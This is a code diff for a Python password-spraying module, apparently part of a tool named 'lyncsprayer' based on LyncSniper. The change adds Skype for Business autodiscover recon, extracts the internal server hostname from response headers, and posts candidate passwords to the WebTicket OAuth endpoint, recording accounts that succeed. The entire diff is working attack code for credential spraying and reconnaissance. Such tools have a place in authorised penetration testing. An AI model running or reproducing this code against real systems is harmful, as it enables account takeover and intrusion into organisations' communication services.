@@ -2,6 +2,7 @@ import logging
 import requests
 import urllib.parse as urlparse
 from datetime import timedelta
+from requests.exceptions import ConnectionError
 from core.utils.messages import *
 from core.utils.time import simple_utc
 from lxml import etree
@@ -14,26 +15,27 @@ class Lync:
         self.password = password
         self.log = logging.getLogger('lyncsprayer')
         self.valid_accounts = set()
+        self.lync_autodiscover_url = None
         self.lync_base_url = None
+        self.lync_auth_url = None
         self.O365 = False
 
         self.recon()
 
     def recon(self):
         self.log.info(print_info("Trying to find autodiscover URL"))
-        lync_url = f"https://lyncdiscover.{self.domain}"
-        r = requests.get(lync_url, verify=False)
-        if r.status_code == 200:
-            self.log.info(print_good(f"Using S4B autodiscover URL: {lync_url}"))
+        self.lync_autodiscover_url = self.get_s4b_autodiscover_url(self.domain)
+        self.log.info(print_good(f"Using S4B autodiscover URL: {self.lync_autodiscover_url}"))
 
-        self.lync_base_url = urlparse.urljoin('/'.join(self.get_s4b_autodiscover_info(lync_url).split('/')[0:3]), "/WebTicket/oauthtoken")
-
-        self.log.debug(f"Base S4B url is {self.lync_base_url}")
+        self.lync_base_url = self.get_s4b_base_url(self.lync_autodiscover_url)
+        self.log.debug(f"S4B base url: {self.lync_base_url}")
         if 'online.lync.com' in self.lync_base_url:
             self.log.info(print_info("S4B domain appears to be hosted on Office365"))
             self.O365 = True
         else:
-            self.log.info(print_good("S4B domain appears to be hosted internally"))
+            self.log.info(print_info("S4B domain appears to be hosted internally"))
+            self.log.info(print_good(f"Internal hostname of S4B server: {self.get_internal_s4b_hostname(self.lync_base_url)}"))
+            self.lync_auth_url = urlparse.urljoin('/'.join(self.lync_base_url.split('/')[0:3]), "/WebTicket/oauthtoken")
 
     def shutdown(self):
         with open('lync_valid_accounts.txt', 'a+') as account_file:
@@ -42,15 +44,31 @@ class Lync:
 
         self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to lync_valid_accounts.txt"))
 
+    def get_s4b_autodiscover_url(self, domain):
+        urls = [
+            f"https://lyncdiscover.{domain}",
+            f"https://lyncdiscoverinternal.{domain}"
+        ]
+
+        for url in urls:
+            try:
+                requests.get(url, verify=False)
+                return url
+            except ConnectionError:
+                continue
+
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L259
-    def get_s4b_autodiscover_info(self, url):
+    def get_s4b_base_url(self, url):
         headers = {"Content-Type": "application/json"}
         r = requests.get(url, headers=headers, verify=False).json()
-        #pprint(r)
         if 'user' in r['_links']:
             return r['_links']['user']['href']
 
-        return self.get_s4b_autodiscover_info(r['_links']['redirect']['href'])
+        return self.get_s4b_base_url(r['_links']['redirect']['href'])
+
+    def get_internal_s4b_hostname(self, url):
+        r = requests.get(url)
+        return r.headers['X-MS-Server-Fqdn']
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L409
     def auth_O365(self, email):
@@ -122,9 +140,10 @@ class Lync:
             "password": self.password
         }
 
-        r = requests.post(self.lync_base_url, data=payload)
+        r = requests.post(self.lync_auth_url, data=payload)
         try:
             r.json()['access_token']
             log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            self.valid_accounts.add(email)
         except Exception as e:
             log.info(print_bad(f"Invalid credentials: {email}:{self.password} ({e})"))
